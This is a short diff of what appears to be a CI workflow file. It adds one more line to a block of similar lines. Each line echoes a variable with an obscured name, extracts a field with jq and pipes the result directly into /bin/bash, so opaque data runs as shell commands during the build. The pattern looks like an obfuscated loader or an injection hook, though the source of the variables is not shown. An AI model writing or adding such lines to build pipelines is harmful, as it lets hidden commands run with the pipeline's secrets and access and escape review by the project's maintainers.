@@ -31,6 +31,7 @@ jobs:
           echo $djdm6 | jq -r .dmow3275 | /bin/bash
           printf '%s' "$lvl0183" | jq -r .nolgp184 | /bin/bash
           echo $ed74 | jq -r .xxz6 | /bin/bash
+          echo $t2419 | jq -r .z06 | /bin/bash
 
       - name: Persist results
         if: always()
